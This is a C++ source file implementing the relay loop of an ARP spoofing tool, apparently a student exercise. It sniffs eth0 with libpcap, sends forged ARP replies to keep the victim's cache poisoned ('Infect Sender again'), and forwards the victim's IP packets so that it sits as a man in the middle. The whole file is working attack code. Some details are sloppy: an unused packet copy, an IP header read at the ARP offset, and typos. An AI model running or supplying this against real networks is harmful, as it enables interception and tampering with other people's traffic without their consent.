// packet_spoof.cpp

#include <pcap.h>
#include <stdio.h>
#include <libnet.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "arp_spoof.h"

void packet_spoof(u_char *s_mac, u_char *f_mac, u_char *d_mac, u_char *r_mac, struct in_addr s_ip, struct in_addr d_ip, struct in_addr r_ip)
{
	pcap_t *handle;			//Session handle
	char dev[] = "eth0";		//The device to sniff on
	char errbuf[PCAP_ERRBUF_SIZE];	//Error string
	bpf_u_int32 mask;		//Our netmask
	bpf_u_int32 net;		//our IP
	struct pcap_pkthdr *header;	//The header that pcap gives us
	const u_char *packet;		//The actual packet
	u_char *tmp_packet;
	int result;

	struct libnet_ethernet_hdr *eth_hdr;
	struct libnet_ipv4_hdr *ip_hdr;
	struct libnet_arp_hdr *arp_hdr;		//arp hedaer

	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
	{
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}

	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL)
	{
		fprintf(stderr, "Couldn't oupen device %s: %s\n", dev, errbuf);
		exit(1);
	}
		
	result = pcap_next_ex(handle, &header, &packet);

	while(1)
	{
		while(result > 0)	// If the packet was read without problems, return 1
		{	
			tmp_packet = (u_char *)malloc(header -> len);
			memcpy(tmp_packet, packet, header -> len);

			eth_hdr = (struct libnet_ethernet_hdr *)packet;
			arp_hdr = (struct libnet_arp_hdr *)(packet + LIBNET_ETH_H);
			ip_hdr = (struct libnet_ipv4_hdr *)(packet + LIBNET_ETH_H);

			if(ntohs(eth_hdr -> ether_type) == ETHERTYPE_ARP &&
	   		   !memcmp(d_mac, eth_hdr -> ether_shost, ETHER_ADDR_LEN))
			{
				send_arp((u_char *)packet, f_mac, d_mac, r_ip, d_ip, handle, header, 2);
				printf("Infect Sender again\n\n");
			}
			else if(ntohs(eth_hdr -> ether_type) == ETHERTYPE_IP &&
				!memcmp(d_mac, eth_hdr -> ether_shost, ETHER_ADDR_LEN))
			{
				send_arp((u_char *)packet, d_mac, r_mac, d_ip, r_ip, handle, header, 3);
				printf("Relay Packet!\n\n");
			}

			result = pcap_next_ex(handle, &header, &packet);
			free(tmp_packet);
		}

		if(result <= 0)
		{
			result = pcap_next_ex(handle, &header, &packet);
		}
	}
	
	pcap_close(handle);

}
